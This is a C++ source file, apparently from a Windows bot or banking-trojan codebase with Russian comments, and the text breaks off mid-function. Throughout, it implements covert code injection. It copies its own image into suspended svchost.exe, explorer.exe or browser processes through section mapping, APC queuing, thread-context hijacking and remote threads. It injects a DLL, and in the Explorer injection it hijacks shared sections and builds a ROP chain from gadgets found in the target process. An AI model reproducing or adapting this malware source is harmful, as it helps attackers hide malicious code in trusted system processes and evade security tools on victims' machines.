#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "ntdll.h"
#include "Inject.h"
#include "zdisasm.h"
#include "BotDebug.h"


#define MakePtr( cast, ptr, addValue ) (cast)( (DWORD_PTR)(ptr) + (DWORD_PTR)(addValue)) 
#define MakeDelta(cast, x, y) (cast) ( (DWORD_PTR)(x) - (DWORD_PTR)(y)) 

DWORD dwNewBase = 0;

DWORD GetImageBase2()
{
	DWORD dwRet = 0;
  /*	__asm
	{
			call getbase
		getbase:
			pop eax
			and eax, 0ffff0000h
		find:
			cmp word ptr [ eax ], 0x5a4d
			je end
			sub eax, 00010000h
			jmp find
		end:
			mov [dwRet], eax
	} */

	return dwRet;
}


void PerformRebase( LPVOID lpAddress, DWORD dwNewBase )
{
	PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)lpAddress;

	if ( pDH->e_magic != IMAGE_DOS_SIGNATURE )
	{
		return;
	}

	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((char *)pDH + pDH->e_lfanew);

	if ( pPE->Signature != IMAGE_NT_SIGNATURE )
	{
		return;
	}

	DWORD dwDelta = dwNewBase - pPE->OptionalHeader.ImageBase;

	DWORD dwVa = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	DWORD dwCb = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	PIMAGE_BASE_RELOCATION pBR = MakePtr( PIMAGE_BASE_RELOCATION, lpAddress, dwVa );

	UINT c = 0;

	while ( c < dwCb )
	{
		c += pBR->SizeOfBlock;

		int RelocCount = (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		LPVOID lpvBase = MakePtr(LPVOID, lpAddress, pBR->VirtualAddress);

		WORD *areloc = MakePtr(LPWORD, pBR, sizeof(IMAGE_BASE_RELOCATION));

		for ( int i = 0; i < RelocCount; i++ )
		{
			int type = areloc[i] >> 12;

			if ( !type )
			{
				continue;
			}

			if ( type != 3 )
			{
				return;
			}

			int ofs = areloc[i] & 0x0fff;

			DWORD *pReloc = MakePtr( DWORD *, lpvBase, ofs );

			if ( *pReloc - pPE->OptionalHeader.ImageBase > pPE->OptionalHeader.SizeOfImage )
			{
				return;
			}

			*pReloc += dwDelta;
		}

		pBR = MakePtr( PIMAGE_BASE_RELOCATION, pBR, pBR->SizeOfBlock );
	}

	pPE->OptionalHeader.ImageBase = dwNewBase;

	return;
}

typedef struct 
{
	WORD	Offset:12;
	WORD	Type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

void ProcessRelocs( PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD RelocSize )
{
	PIMAGE_BASE_RELOCATION Reloc = Relocs;

	while ( (DWORD)Reloc - (DWORD)Relocs < RelocSize ) 
	{
		if ( !Reloc->SizeOfBlock )
		{
			break;
		}

		PIMAGE_FIXUP_ENTRY Fixup = (PIMAGE_FIXUP_ENTRY)((ULONG)Reloc + sizeof(IMAGE_BASE_RELOCATION));

		for ( ULONG r = 0; r < (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; r++ ) 
		{
			DWORD dwPointerRva = Reloc->VirtualAddress + Fixup->Offset;

			if ( Fixup->Type == IMAGE_REL_BASED_HIGHLOW )
			{
				*(PULONG)((ULONG)ImageBase + dwPointerRva) += Delta;
			}

			Fixup++;
		}

		Reloc = (PIMAGE_BASE_RELOCATION)( (ULONG)Reloc + Reloc->SizeOfBlock );
	}

	return;
}



DWORD InjectCode( HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartProc )
{
	HMODULE hModule = (HMODULE)GetImageBase(lpStartProc);

	PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((LPSTR)pDH + pDH->e_lfanew);

	DWORD dwSize = pPE->OptionalHeader.SizeOfImage;

	LPVOID lpNewAddr = MemAlloc( dwSize );

	if ( lpNewAddr == NULL )
	{
		return -1;
	}

	m_memcpy( lpNewAddr, hModule, dwSize );

	LPVOID lpNewModule = NULL;

	DWORD dwAddr = -1;
	HMODULE hNewModule = NULL;

	if ( (NTSTATUS)pZwAllocateVirtualMemory( hProcess, &lpNewModule, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )
	{
		hNewModule = (HMODULE)lpNewModule;	

		ULONG RelRVA   = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (DWORD)hModule + RelRVA ), (DWORD)lpNewAddr, (DWORD)hNewModule - (DWORD)hModule, RelSize );		

		dwNewBase = (DWORD)hNewModule;

		if ( (NTSTATUS)pZwWriteVirtualMemory( hProcess,   hNewModule, lpNewAddr, dwSize, NULL ) == STATUS_SUCCESS )
		{
			dwAddr = (DWORD)lpStartProc - (DWORD)hModule + (DWORD)hNewModule;
		}
	}

	DWORD dwOldProtect = 0;
	pZwProtectVirtualMemory( hProcess, (PVOID*)&hNewModule, &dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect );
	
	MemFree( lpNewAddr );
	
	return dwAddr;
}


//---------------------------------------------------
//  Функция инжектит образ в указанный процесс
//---------------------------------------------------
bool InjectCode2( HANDLE hProcess, HANDLE hThread, TInjectFunction f_Main)
{
	DWORD dwBase = (DWORD)GetImageBase(f_Main);
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );

    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );

	if ( lpView == NULL )
	{
		return false;
	}

	m_memcpy( lpView, (LPVOID)dwBase, dwSize );

	DWORD dwViewSize    = 0;
	DWORD dwNewBaseAddr = 0;
	bool Result = false;

	NTSTATUS Status = (NTSTATUS)pZwMapViewOfSection( hMap, hProcess, (PVOID*)&dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE );

	if ( Status == STATUS_SUCCESS )
	{
		PIMAGE_DOS_HEADER dHeader   = (PIMAGE_DOS_HEADER)dwBase;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);

		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (LPBYTE)dwBase + RelRVA ), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize );

		DWORD dwAddr = (DWORD)f_Main - dwBase + dwNewBaseAddr;

		Status = (NTSTATUS)pZwQueueApcThread( hThread, (PKNORMAL_ROUTINE)dwAddr, NULL, NULL, NULL );
		if (Status == STATUS_SUCCESS)
		{
			Status = (NTSTATUS)pZwResumeThread( (DWORD)hThread, NULL );
			Result = (Status == STATUS_SUCCESS);
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	pUnmapViewOfFile( lpView );
    pCloseHandle( hMap );

	return Result;
}

bool InjectCode3( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwAddr = InjectCode( hProcess, f_Main );

	if ( dwAddr != -1 )
	{
		CONTEXT Context;

		m_memset( &Context, 0, sizeof( CONTEXT ) );

		Context.ContextFlags = CONTEXT_INTEGER;
		Context.Eax			 = dwAddr;

		DWORD dwBytes = 0;

        pWriteProcessMemory( hProcess,(LPVOID)( Context.Ebx + 8 ), &dwNewBase, 4, &dwBytes );
        pZwSetContextThread( hThread, &Context );
        pZwResumeThread( (DWORD)hThread, NULL );
	}

	return true;
}

//
bool InjectCode4( HANDLE hProcess, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwBase = (DWORD)GetImageBase(f_Main);
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );

    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );

	if ( lpView == NULL )
	{
		return false;
	}

	m_memcpy( lpView, (LPVOID)dwBase, dwSize );

	DWORD dwViewSize    = 0;
	DWORD dwNewBaseAddr = 0;
	bool Result = false;

	NTSTATUS Status = (NTSTATUS)pZwMapViewOfSection( hMap, hProcess, (PVOID*)&dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE );

	if ( Status == STATUS_SUCCESS )
	{		
		PIMAGE_DOS_HEADER dHeader   = (PIMAGE_DOS_HEADER)dwBase;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);

		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( dwBase + RelRVA ), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize );		

		DWORD dwAddr = (DWORD)f_Main - dwBase + dwNewBaseAddr;

		//pZwResumeThread( hThread, NULL );
		DWORD id;

		if (pCreateRemoteThread(hProcess, NULL,0,(LPTHREAD_START_ROUTINE)dwAddr,NULL,0,&id) )
			Result = true;
	}

	pUnmapViewOfFile( lpView );
	pCloseHandle( hMap );

	return Result;
}

bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread )
{
	WCHAR Svchost[] = {'s','v','c','h','o','s','t','.','e','x','e',0};
	WCHAR Args[]	= {'-','k',' ','n','e','t','s','v','c','s',0};

	WCHAR *SysPath = (WCHAR*)MemAlloc( 512 );

	if ( !SysPath )
	{
		return false;
	}

	pGetSystemDirectoryW( SysPath, 512 );

	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Svchost );

	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		
	si.cb	= sizeof( STARTUPINFOW );

	bool ret = false;
	
	if( (BOOL)pCreateProcessW( SysPath, Args, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		ret = true;
	}

	MemFree( SysPath );
	return ret;
}

bool CreateExplorer( PHANDLE hProcess, PHANDLE hThread )
{
	WCHAR Explorer[] = {'e','x','p','l','o','r','e','r','.','e','x','e',0};

	WCHAR *SysPath = (WCHAR*)MemAlloc( 512 );

	if ( SysPath == NULL )
	{
		return false;
	}

	pGetWindowsDirectoryW( SysPath, 512 );

	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Explorer );


	HANDLE hTmpProcess = NULL;
	HANDLE hTmpThread  = NULL;

	bool ret = RunFileEx( SysPath, CREATE_SUSPENDED, &hTmpProcess, &hTmpThread );

	if ( ret )
	{
		*hProcess = hTmpProcess;
		*hThread  = hTmpThread;
	}

	MemFree(SysPath);

	return ret;
}


//-------------------------------------------------------
//  Функция возвращает путь к браузеру по умолчанию
//-------------------------------------------------------
wstring GetDefaultBrowserPath()
{
	// Создаём HTML файл
	wstring HTMLFile = GetSpecialFolderPathW(CSIDL_APPDATA, L"index.html");
	File::WriteBufferW(HTMLFile.t_str(), NULL, 0);

	// Получаем имя файла
	wstring FileName(MAX_PATH);
	if (pFindExecutableW(HTMLFile.t_str(), NULL, FileName.t_str()))
		FileName.CalcLength();
	else
		FileName.Clear();

	// Удаляем временный файл
	pDeleteFileW(HTMLFile.t_str());

	return FileName;
}


bool CreateDefaultBrowser( PHANDLE hProcess, PHANDLE hThread )
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		
	si.cb	= sizeof( STARTUPINFOW );

	wstring BrowserPath = GetDefaultBrowserPath();

	if (BrowserPath.IsEmpty())
		return false;

	if(pCreateProcessW(BrowserPath.t_str(), NULL, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		return true;
	}

	return false;
}

bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateDefaultBrowser( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateSvchost( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
			return true;
		else
			pTerminateThread( hThread, 0 );
	}

	return false;
}


bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !JmpToSvchostSelf( f_Main ) )
	{
		if ( !JmpToBrowserSelf( f_Main ) )
		{
			return false;
		}
	}

	return true;
}

bool JmpToBrowser( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateDefaultBrowser( &hProcess, &hThread ) )
	{
		if ( InjectCode3( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}

bool JmpToSvchost( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	bool bRet = false;

	if ( CreateSvchost( &hProcess, &hThread ) )
	{
		if ( InjectCode3( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !JmpToSvchost( f_Main ) )
	{
		if ( !JmpToBrowser( f_Main ) )
		{
			return false;
		}
	}

	return true;
}


//---------------------------------------------------
//  MegaJump - Функция создаёт процесс svchost.exe и
//             осуществляет инжект в него
//---------------------------------------------------
BOOL WINAPI MegaJump(TInjectFunction f_Main)
{
	if ( !TwiceJumpSelf( f_Main ) )
	{
		if ( !TwiceJump( f_Main ) )
		{
			return FALSE;
		}
	}
	return TRUE;
}

//---------------------------------------------------
//  JmpToExplorer - Функция запускает копию
//                  эксплорера и инжектится в него
//---------------------------------------------------
BOOL WINAPI JmpToExplorer(TInjectFunction f_Main)
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	BOOL Result = FALSE;
	if (CreateExplorer( &hProcess, &hThread))
	{
		Result = InjectCode2(hProcess, hThread, f_Main);
		if (!Result)
			pTerminateThread( hThread, 0 );
	}

	return Result;
}


bool InjectIntoProcess( DWORD pid, TInjectFunction func)
{
	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
	CLIENT_ID ClientID;

	ClientID.UniqueProcess = (HANDLE)pid;
	ClientID.UniqueThread  = 0;

	HANDLE hProcess;
		
	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
	{
		return false;
	}

	DWORD dwAddr = InjectCode( hProcess, func );

	bool ret = false;

	if ( dwAddr != -1 )
	{
		LPVOID Thread = pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, 0 );
		ret = Thread != NULL;
	}

	pZwClose(hProcess); 
	
	return ret;
}

bool InjectIntoProcess2( DWORD pid, DWORD (WINAPI *func)(LPVOID) )
{
	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
	CLIENT_ID ClientID;

	ClientID.UniqueProcess = (HANDLE)pid;
	ClientID.UniqueThread  = 0;

	DWORD Flags = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
	HANDLE Process = (HANDLE)pOpenProcess(Flags, FALSE, pid);
//    HANDLE hProcess;
//	if ( pZwOpenProcess(&hProcess, Flags, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
//		return false;
	bool Result = InjectCode4(Process, func);
	CloseHandle(Process);
	return Result;
}


//---------------------------------------------------
//  InjecIntoProcessByName
//  Функция запускает процесс с именем AppName и
//  инжектится в него
//---------------------------------------------------
BOOL WINAPI InjecIntoProcessByNameA(const char* AppName, const char* CmdLine, TInjectFunction Function)
{
	if (STRA::IsEmpty(AppName) || !Function)
		return FALSE;

	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	ClearStruct(si);
	si.cb = sizeof(si);

	
	if(!pCreateProcessA(AppName, CmdLine, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ))
		return FALSE;
	return InjectCode2(pi.hProcess, pi.hThread, Function);
}


//---------------------------------------------------
//  InjectIntoExplorer - Функция инжектит образ
//                       в запущенный экземпляр
//                       эксплорера
//---------------------------------------------------
BOOL WINAPI InjectIntoExplorer(TInjectFunction f_Main)
{
	if( !NewInject::InjectExplore32(f_Main) )
	{
		DWORD Pid = GetExplorerPid();
		if (!Pid) return FALSE;
		return InjectIntoProcess(Pid, f_Main );
	}
	return TRUE;
}


bool InjectDll( WCHAR *DllPath )
{
	if ( pGetFileAttributesW( DllPath ) )
	{
		HANDLE hProcess;
		HANDLE hThread;

		if ( !CreateSvchost( &hProcess, &hThread ) )
		{
			if ( !CreateDefaultBrowser( &hProcess, &hThread ) )
			{
				return false;
			}
		}
		
		DWORD dwWritten;

		LPVOID lpStringLoc = pVirtualAllocEx( hProcess, 0, m_wcslen( DllPath ) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
		
		if ( !(BOOL)pWriteProcessMemory( hProcess, lpStringLoc, DllPath, m_wcslen( DllPath ) + 1, &dwWritten ) )
		{
			return false;
		}

		pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddressEx( NULL, 1, 0xC8AC8030 ), lpStringLoc, 0, 0 );
	}
		
	
	return true;
}

namespace NewInject
{

#define InitializeObjectAttributes( p, n, a, r, s ) {   \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

#define RtlOffsetToPointer(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))

struct PARAM_DATA
{
	PVOID func;
	PVOID imageBase;
};

struct CODE_DATA
{
	BOOL (WINAPI *_CloseHandle)(HANDLE hObject);
	LPVOID (WINAPI *_MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
	HANDLE (WINAPI *_OpenFileMappingA)(DWORD dwDesiredAccess, BOOL bInheritHandle, char* lpName);
	HANDLE (WINAPI *_CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, PVOID lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	LONG (WINAPI *_SetWindowLongA)(HWND hWnd, int nIndex, LONG dwNewLong);
	void (WINAPI *_OutputDebugStringA)( char* lpOutputString );

	BOOLEAN injectFlag;
	HWND wnd;
	LONG oldLong;
	PVOID injectNormalRoutine;
	PARAM_DATA param;
	char sectionName[32];
	char temp[3];
};

struct INJECT32_DATA
{
	DWORD ropCode[32];
	DWORD newLongVTable[8];
	CODE_DATA codeData;
	CHAR injectCode[0x100];
};

static VOID __declspec(naked) Inject32Start( CODE_DATA* data )
{
	__asm mov ebp, esp

	if (!data->injectFlag)
	{
		data->injectFlag = TRUE;

		HANDLE map;
		if( map = data->_OpenFileMappingA( FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, FALSE, data->sectionName ))
		{
			PVOID mapping;
			if( mapping = data->_MapViewOfFile( map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0 ) )
			{
				data->param.imageBase = mapping;
				data->_CreateThread( NULL, 0, RtlOffsetToPointer( mapping, data->injectNormalRoutine ), &data->param, 0, NULL );
			}
			data->_CloseHandle(map);
		}
	}

	data->_SetWindowLongA( data->wnd, 0, data->oldLong );

	__asm
	{
		xor eax, eax
		add esp, 0x54
		pop ebp
		ret 0x10
	}

}

static VOID __declspec(naked) Inject32End()
{
}

//#pragma optimize("", on)

PVOID GetKiUserApcDispatcherProc()
{
	BYTE* procAddress = (BYTE*)pGetProcAddress( pGetModuleHandleA("ntdll.dll"), "KiUserApcDispatcher" );
	BYTE* address = procAddress;
	DWORD i = 0;

	while( *(BYTE*)address != 0x58 && *(WORD*)address != 0x7C8D && *(BYTE*)((DWORD)address + 2) != 0x24)
	{
		DWORD len;
		i++;
		GetInstLenght( (DWORD*)address, &len );
		address += len;
		if( i >= 0x14 ) return procAddress;
	}

	return address;
}

DWORD CompareMemoryAndRead( HANDLE process, PVOID remoteAddress, SIZE_T remoteSize, PVOID memory, SIZE_T size)
{
	BYTE* local;
	DWORD rva = 0;
	SIZE_T t;

	if( local = (BYTE*)pVirtualAlloc( NULL, remoteSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) )
	{
		if( pReadProcessMemory( process, remoteAddress, local, remoteSize, &t ) )
		{
			BYTE* addr = (BYTE*)m_memmem( local, remoteSize, memory, size );
			if( addr )
				rva = addr - local;
		}
		pVirtualFree( local, 0, MEM_RELEASE );
	}
	return rva;
}

PVOID FindCodeInProcessCode( HANDLE process, PVOID memory, SIZE_T size)
{
	PVOID ret = NULL;
	HMODULE *mods = (HMODULE*)HEAP::Alloc(0x410);
	DWORD needed;

	if( mods )
	{
		if( pEnumProcessModules( process, mods, 0x410, &needed ) )
		{
			PVOID buffer = HEAP::Alloc(0x400);

			if( buffer )
			{
				for( DWORD i = 0; i < (needed / sizeof(HMODULE)); i++ )
				{
					SIZE_T t;

					if( pReadProcessMemory( process, mods[i], buffer, 0x400, &t ) )
					{
						PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(buffer);
						if( ntHeaders )
						{
							PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

							for( WORD c = 0; c < ntHeaders->FileHeader.NumberOfSections; c++ )
							{
								if( !plstrcmpiA( (PCHAR)section[c].Name, ".text" ) )
								{
									PVOID baseAddress = RtlOffsetToPointer( (PVOID)mods[i], (PVOID)section[c].VirtualAddress );
									DWORD rva = CompareMemoryAndRead( process, baseAddress, section[c].Misc.VirtualSize, memory, size );
									if( rva )
										ret = RtlOffsetToPointer( baseAddress, rva );
									break;
								}
							}
						}
					}
					if( ret ) break;
				}
				HEAP::Free(buffer);
			}
		}
		HEAP::Free(mods);
	}

	return ret;
}

PVOID FindCodeInProcess( HANDLE process, PVOID memory, SIZE_T size )
{
	PVOID address = NULL;
	MEMORY_BASIC_INFORMATION info;
	DWORD rva;

	while( pVirtualQueryEx( process, address, &info, sizeof(info) ) )
	{
		if( rva = CompareMemoryAndRead( process, address, info.RegionSize, memory, size ) )
			return RtlOffsetToPointer( info.AllocationBase, rva );

		address = RtlOffsetToPointer( address, info.RegionSize);
	}

	return NULL;
}

bool Explore32CreateSH( INJECT32_DATA* ourMapInjectData, HANDLE process, INJECT32_DATA* remoteAddress, DWORD sizeOfShellCode)
{
	UCHAR firstSign[] = {0xB9, 0x94, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x5F, 0x33, 0xC0, 0x5E, 0x5D, 0xC2, 0x08, 0x00};
	UCHAR cldRetBytes[] = {0xFD, 0xC3};
	UCHAR stdRetBytes[] = {0xFC, 0xC3};
	UCHAR retBytes[] = {0x58, 0xC3};
	UCHAR jmpEaxBytes[] = {0xFF, 0xE0};

	ourMapInjectData->newLongVTable[0] = (DWORD)&remoteAddress->newLongVTable[5];
	ourMapInjectData->newLongVTable[5] = (DWORD)GetKiUserApcDispatcherProc();
	ourMapInjectData->newLongVTable[7] = (DWORD)FindCodeInProcessCode( process, cldRetBytes, sizeof(cldRetBytes) );
	ourMapInjectData->newLongVTable[6] = (DWORD)FindCodeInProcessCode( process, firstSign, sizeof(firstSign) );

	for( DWORD i = 0; i < 32; i++ ) ourMapInjectData->ropCode[i] = i;

	ourMapInjectData->ropCode[25] = (DWORD)FindCodeInProcessCode( process, stdRetBytes, sizeof(stdRetBytes) );
	ourMapInjectData->ropCode[28] = (DWORD)FindCodeInProcessCode( process, retBytes, sizeof(retBytes) );
	ourMapInjectData->ropCode[29] = 0x70;
	HANDLE ntdll = pGetModuleHandleA("ntdll.dll");
	HANDLE kernel32 = pGetModuleHandleA("kernel32.dll");
	ourMapInjectData->ropCode[30] = (DWORD)pGetProcAddress( ntdll, "_chkstk" );
	ourMapInjectData->ropCode[31] = (DWORD)pGetProcAddress( kernel32, "WriteProcessMemory" );
	ourMapInjectData->ropCode[5] = (DWORD)NtCurrentProcess();
	ourMapInjectData->ropCode[6] = (DWORD)pGetProcAddress( ntdll, "atan" );
	ourMapInjectData->ropCode[7] = (DWORD)&remoteAddress->injectCode[0];
	ourMapInjectData->ropCode[8] = sizeOfShellCode;
	ourMapInjectData->ropCode[9] = (DWORD)&remoteAddress->ropCode[12];
	ourMapInjectData->ropCode[10] = ourMapInjectData->ropCode[6];	// eax = atan
	ourMapInjectData->ropCode[4] = ourMapInjectData->ropCode[28];	// pop eax, ret
	ourMapInjectData->ropCode[11] = (DWORD)FindCodeInProcessCode( process, jmpEaxBytes, sizeof(jmpEaxBytes) );
	ourMapInjectData->ropCode[14] = (DWORD)&remoteAddress->codeData;	

	return true;
}

NTSTATUS OpenAndMapSection( PHANDLE phSection, PWCHAR nameSection, PVOID *address )
{
	UNICODE_STRING usNameSection;
	pRtlInitUnicodeString( &usNameSection, nameSection );

	OBJECT_ATTRIBUTES objAttr;
	//InitializeObjectAttributes( &objAttr, &usNameSection, OBJ_OPENIF, 0, 0 );
	objAttr.uLength = sizeof(OBJECT_ATTRIBUTES);
	objAttr.hRootDirectory = 0;
	objAttr.uAttributes = OBJ_OPENIF;
	objAttr.pObjectName = &usNameSection;
	objAttr.pSecurityDescriptor = 0;
	objAttr.pSecurityQualityOfService = 0;
	
	NTSTATUS st = (NTSTATUS)pNtOpenSection( phSection, SECTION_MAP_READ | SECTION_MAP_WRITE, &objAttr );
	if( NT_SUCCESS(st) )
	{
		ULONG_PTR size = 0;
		st = (NTSTATUS)pNtMapViewOfSection( *phSection, NtCurrentProcess(), address, 0, 0, NULL, &size, ViewUnmap, 0, PAGE_READWRITE);
		if( !NT_SUCCESS(st) ) pNtClose(*phSection);
	}

	return st;
}

bool OpenSectionForInject(PHANDLE phSection, PVOID *address, ULONG *size)
{
	PWCHAR sections[] = {
		L"\\BaseNamedObjects\\ShimSharedMemory",
		L"\\BaseNamedObjects\\windows_shell_global_counters",
		L"\\BaseNamedObjects\\MSCTF.Shared.SFM.MIH",
		L"\\BaseNamedObjects\\MSCTF.Shared.SFM.AMF",
		L"\\BaseNamedObjects\\UrlZonesSM_Administrator",
		L"\\BaseNamedObjects\\UrlZonesSM_SYSTEM",
		0
	};

	for( int i = 0; sections[i]; i++ )
	{
		if( NT_SUCCESS( OpenAndMapSection( phSection, sections[i], address ) ) )
		{
			MEMORY_BASIC_INFORMATION info;

			pVirtualQuery( *address, &info, sizeof(info) );
			*size = info.RegionSize;

			return true;
		}
	}

	return false;
}

INJECT32_DATA* InjectExplore32CreateSH( DWORD pid, INJECT32_DATA* ourMapInjectData, DWORD sizeOfShellCodeWithData, DWORD sizeOfShellCode )
{
	INJECT32_DATA *ret = NULL, *remoteAddress = NULL;
	//DWORD pid = GetExplorerPid();

	if( pid )
	{
		HANDLE process = pOpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid );
		if( process != INVALID_HANDLE_VALUE )
		{
			if( remoteAddress = (INJECT32_DATA*)FindCodeInProcess( process, ourMapInjectData, sizeOfShellCodeWithData ) )
			{
				if( Explore32CreateSH( ourMapInjectData, process, remoteAddress, sizeOfShellCode ) )
				{
					ret = remoteAddress;
				}
			}

			pCloseHandle(process);
		}
	}
	return ret;
}


DWORD Inject32Normal( PARAM_DATA* param )
{
